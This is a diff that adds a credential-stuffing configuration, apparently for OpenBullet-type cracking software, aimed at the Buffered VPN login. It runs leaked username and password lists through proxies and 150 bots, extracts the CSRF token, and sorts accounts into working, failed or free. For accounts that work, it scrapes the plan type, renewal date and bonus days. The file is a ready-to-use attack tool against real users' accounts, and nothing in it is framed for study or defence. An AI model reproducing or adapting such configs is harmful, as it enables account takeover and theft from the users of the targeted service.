@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "BufferedVPN_Huffy",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-19T01:20:15.0755696+08:00",
+  "AdditionalInfo": "",
+  "Author": "Huffy",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://buffered.com/login?next=/dashboard" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "DNT: 1" 
+
+PARSE "<SOURCE>" LR "csrfmiddlewaretoken\" value=\"" "\"" -> VAR "token" 
+
+REQUEST POST "https://buffered.com/login?next=/dashboard" 
+  CONTENT "csrfmiddlewaretoken=<token>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "referer: https://buffered.com/login?next=/dashboard" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Please enter a correct username and password" 
+  KEYCHAIN Success OR 
+    KEY "Welcome," 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "This is a Free Account" 
+
+REQUEST GET "https://buffered.com/payments/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "dnt: 1" 
+  HEADER "referer: https://buffered.com/tokens" 
+
+PARSE "<SOURCE>" LR "th>Price</th>" "strong>active" -> VAR "plan" 
+
+PARSE "<plan>" LR "<td>" "</td>" -> CAP "Plan type" 
+
+PARSE "<SOURCE>" LR "Subscription renewal at: <strong>" "</strong></" -> CAP "Renews on" 
+
+PARSE "<SOURCE>" LR "Bonus days: <strong>" "</strong> " -> CAP "Bonus days" 
+
